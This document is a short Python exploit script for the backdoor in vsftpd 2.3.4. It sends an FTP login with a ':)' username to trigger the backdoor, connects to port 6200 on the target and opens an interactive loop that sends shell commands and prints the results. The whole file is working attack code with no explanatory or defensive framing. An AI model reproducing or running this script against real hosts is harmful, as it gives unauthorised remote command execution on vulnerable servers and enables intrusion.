#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
from sys import argv


def exploit():
	if(len(argv) < 2):
		ip = "127.0.0.1";
	else:
		ip = argv[1];
	print("[?]Connecting to {}.".format(ip));
	try:
		print("[?]Connecting to ftp.");
		ftp = socket(AF_INET, SOCK_STREAM);
		ftp.connect((ip, 21));
		ftp.send("USER a:)\n".encode());
		ftp.send("PASS binariowashere".encode());
		sleep(2);
		print("[+]Ftp connection was stablished correctly.");
		print("[?]Connecting to backdoor.");
		sock = socket(AF_INET, SOCK_STREAM);
		sock.connect((ip, 6200));
	except Exception as e:
		print("[-]Connection faliure");
		print(e);
		exit();
	else:
		print("[+]The connection was stablished correctly.");
		cmd = "";
		while(cmd != "close_backdoor"):
			cmd = input("vsftpd> ");
			try:
				sock.send("{}\n".format(cmd).encode());
				recv = sock.recv(1024).decode("utf-8");
			except Exception as e:
				print(e);
			else:
				print(recv);
		ftp.close();
		sock.close();
	finally:
		print("Done!");


if __name__ == '__main__':
	exploit();
